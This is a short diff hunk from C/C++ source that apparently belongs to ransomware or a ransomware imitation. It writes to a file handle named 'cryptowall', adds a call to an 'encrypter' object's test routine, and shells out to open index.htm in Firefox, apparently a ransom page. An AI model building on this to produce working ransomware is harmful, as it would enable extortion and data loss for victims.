@@ -158,6 +158,8 @@ int main(int argc, char* argv[]) {
     cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
     fwrite(cfbuffer, sizeof(char), 6, cryptowall);
     fclose(cryptowall);
+
+    encrypter->test();
   }
 
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window index.htm");
